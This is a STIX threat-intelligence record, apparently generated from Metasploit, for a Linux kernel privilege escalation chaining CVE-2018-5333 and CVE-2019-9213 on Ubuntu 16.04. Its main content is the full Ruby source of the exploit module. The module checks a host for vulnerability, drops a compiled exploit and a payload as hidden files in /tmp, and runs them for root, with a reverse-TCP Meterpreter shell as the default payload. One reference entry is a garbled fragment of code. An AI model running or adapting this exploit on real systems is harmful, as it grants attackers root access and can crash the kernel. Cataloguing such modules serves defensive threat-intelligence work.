{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7ff525c0-5320-4b56-9305-7f026b61baf0",
    "created": "2024-08-14T16:58:42.391472Z",
    "modified": "2024-08-14T16:58:42.391476Z",
    "name": "Reliable Datagram Sockets (RDS) rds_atomic_free_op NULL pointer dereference Privilege Escalation",
    "description": " This module attempts to gain root privileges on Linux systems by abusing a NULL pointer dereference in the `rds_atomic_free_op` function in the Reliable Datagram Sockets (RDS) kernel module (rds.ko).  Successful exploitation requires the RDS kernel module to be loaded. If the RDS module is not blacklisted (default); then it will be loaded automatically.  This exploit supports 64-bit Ubuntu Linux systems, including distributions based on Ubuntu, such as Linux Mint and Zorin OS.  Target offsets are available for:  Ubuntu 16.04 kernels 4.4.0 <= 4.4.0-116-generic; and Ubuntu 16.04 kernels 4.8.0 <= 4.8.0-54-generic.  This exploit does not bypass SMAP. Bypasses for SMEP and KASLR are included. Failed exploitation may crash the kernel.  This module has been tested successfully on various 4.4 and 4.8 kernels.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/rds_atomic_free_op_null_pointer_deref_priv_esc.rb",
            "external_id": "rds_atomic_free_op_null_pointer_deref_priv_esc.rb"
        },
        {
            "source_name": "JannHorn",
            "external_id": "#DiscoveryofMAP_GROWSDOWNmmap_min_addrbypasstechniqueandPoCcode(CVE-2019-9213)"
        },
        {
            "source_name": "wbowling",
            "external_id": "#Cexploitcombining2018-5333andCVE-2019-9213targetingUbuntu16.04kernel4.4.0-116-generic"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-5333"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-9213"
        },
        {
            "source_name": "reference",
            "url": "https://gist.github.com/wbowling/9d32492bd96d9e7c3bf52e23a0ac30a4"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/0x36/CVE-pocs/blob/master/CVE-2018-5333-rds-nullderef.c"
        },
        {
            "source_name": "reference",
            "url": "https://bugs.chromium.org/p/project-zero/issues/detail?id=1792&desc=2"
        },
        {
            "source_name": "reference",
            "url": "https://people.canonical.com/~ubuntu-security/cve/2018/CVE-2018-5333.html"
        },
        {
            "source_name": "reference",
            "url": "https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=7d11f77f84b27cef452cee332f4e469503084737"
        },
        {
            "source_name": "reference",
            "url": "https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=15133f6e67d8d646d0744336b4daa3135452cb0d"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/bcoles/kernel-exploits/blob/master/CVE-2018-5333/cve-2018-5333.c"
        },
        {
            "source_name": "offsets=strip_comments(exploit_data(CVE-2018-5333",
            "external_id": "cve-2018-5333.c)).scan(/kernels\\\\=\\{(.+?)\\};/m).flatten.first"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GoodRanking\n\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::Compile\n  include Msf::Post::Linux::System\n  include Msf::Post::Linux::Kernel\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Reliable Datagram Sockets (RDS) rds_atomic_free_op NULL pointer dereference Privilege Escalation',\n      'Description'    => %q{\n        This module attempts to gain root privileges on Linux systems by abusing\n        a NULL pointer dereference in the `rds_atomic_free_op` function in the\n        Reliable Datagram Sockets (RDS) kernel module (rds.ko).\n\n        Successful exploitation requires the RDS kernel module to be loaded.\n        If the RDS module is not blacklisted (default); then it will be loaded\n        automatically.\n\n        This exploit supports 64-bit Ubuntu Linux systems, including distributions\n        based on Ubuntu, such as Linux Mint and Zorin OS.\n\n        Target offsets are available for:\n\n        Ubuntu 16.04 kernels 4.4.0 <= 4.4.0-116-generic; and\n        Ubuntu 16.04 kernels 4.8.0 <= 4.8.0-54-generic.\n\n        This exploit does not bypass SMAP. Bypasses for SMEP and KASLR are included.\n        Failed exploitation may crash the kernel.\n\n        This module has been tested successfully on various 4.4 and 4.8 kernels.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Mohamed Ghannam', # Discovery of RDS rds_atomic_free_op null pointer dereference and DoS PoC (2018-5333)\n          'Jann Horn',       # Discovery of MAP_GROWSDOWN mmap_min_addr bypass technique and PoC code (CVE-2019-9213)\n          'wbowling',        # C exploit combining 2018-5333 and CVE-2019-9213 targeting Ubuntu 16.04 kernel 4.4.0-116-generic\n          'bcoles',          # Metasploit module and updated C exploit\n          'nstarke'          # Additional kernel offsets\n        ],\n      'DisclosureDate' => '2018-11-01',\n      'Platform'       => [ 'linux' ],\n      'Arch'           => [ ARCH_X64 ],\n      'SessionTypes'   => [ 'shell', 'meterpreter' ],\n      'Targets'        => [[ 'Auto', {} ]],\n      'Privileged'     => true,\n      'References'     =>\n        [\n          [ 'CVE', '2018-5333' ],\n          [ 'CVE', '2019-9213' ],\n          [ 'BID', '102510' ],\n          [ 'URL', 'https://gist.github.com/wbowling/9d32492bd96d9e7c3bf52e23a0ac30a4' ],\n          [ 'URL', 'https://github.com/0x36/CVE-pocs/blob/master/CVE-2018-5333-rds-nullderef.c' ],\n          [ 'URL', 'https://bugs.chromium.org/p/project-zero/issues/detail?id=1792&desc=2' ],\n          [ 'URL', 'https://people.canonical.com/~ubuntu-security/cve/2018/CVE-2018-5333.html' ],\n          [ 'URL', 'https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=7d11f77f84b27cef452cee332f4e469503084737' ],\n          [ 'URL', 'https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=15133f6e67d8d646d0744336b4daa3135452cb0d' ],\n          [ 'URL', 'https://github.com/bcoles/kernel-exploits/blob/master/CVE-2018-5333/cve-2018-5333.c' ]\n        ],\n      'DefaultOptions' => { 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp' },\n      'Notes'          =>\n        {\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability'   => [ CRASH_OS_DOWN ],\n        },\n      'DefaultTarget'  => 0))\n    register_advanced_options [\n      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])\n    ]\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def check\n    arch = kernel_hardware\n    unless arch.include? 'x86_64'\n      return CheckCode::Safe(\"System architecture #{arch} is not supported\")\n    end\n    vprint_good \"System architecture #{arch} is supported\"\n\n    offsets = strip_comments(exploit_data('CVE-2018-5333', 'cve-2018-5333.c')).scan(/kernels\\[\\] = \\{(.+?)\\};/m).flatten.first\n    kernels = offsets.scan(/\"(.+?)\"/).flatten\n\n    version = \"#{kernel_release} #{kernel_version.split(' ').first}\"\n    unless kernels.include? version\n      return CheckCode::Safe(\"Linux kernel #{version} is not vulnerable\")\n    end\n    vprint_good \"Linux kernel #{version} is vulnerable\"\n\n    if smap_enabled?\n      return CheckCode::Safe('SMAP is enabled')\n    end\n    vprint_good 'SMAP is not enabled'\n\n    if lkrg_installed?\n      return CheckCode::Safe('LKRG is installed')\n    end\n    vprint_good 'LKRG is not installed'\n\n    if grsec_installed?\n      return CheckCode::Safe('grsecurity is in use')\n    end\n    vprint_good 'grsecurity is not in use'\n\n    unless kernel_modules.include? 'rds'\n      vprint_warning 'rds.ko kernel module is not loaded, but may be autoloaded during exploitation'\n      return CheckCode::Detected('rds.ko kernel module is not loaded, but may be autoloaded during exploitation')\n    end\n    vprint_good 'rds.ko kernel module is loaded'\n\n    CheckCode::Appears\n  end\n\n  def exploit\n    if !datastore['ForceExploit'] && is_root?\n      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')\n    end\n\n    unless writable? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is not writable\"\n    end\n\n    exploit_path = \"#{base_dir}/.#{rand_text_alphanumeric(5..10)}\"\n\n    if live_compile?\n      vprint_status 'Live compiling exploit on system...'\n      upload_and_compile exploit_path, exploit_data('CVE-2018-5333', 'cve-2018-5333.c')\n    else\n      vprint_status 'Dropping pre-compiled exploit on system...'\n      upload_and_chmodx exploit_path, exploit_data('CVE-2018-5333', 'cve-2018-5333.out')\n    end\n    register_file_for_cleanup exploit_path\n\n    payload_path = \"#{base_dir}/.#{rand_text_alphanumeric(5..10)}\"\n    upload_and_chmodx payload_path, generate_payload_exe\n    register_file_for_cleanup payload_path\n\n    # mincore KASLR bypass is usually fast, but can sometimes take up to 30 seconds to complete\n    timeout = 30\n    print_status \"Launching exploit (timeout: #{timeout})...\"\n    output = cmd_exec(\"echo '#{payload_path} & exit' | #{exploit_path}\", nil, timeout)\n    output.each_line { |line| vprint_status line.chomp }\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-11-01",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}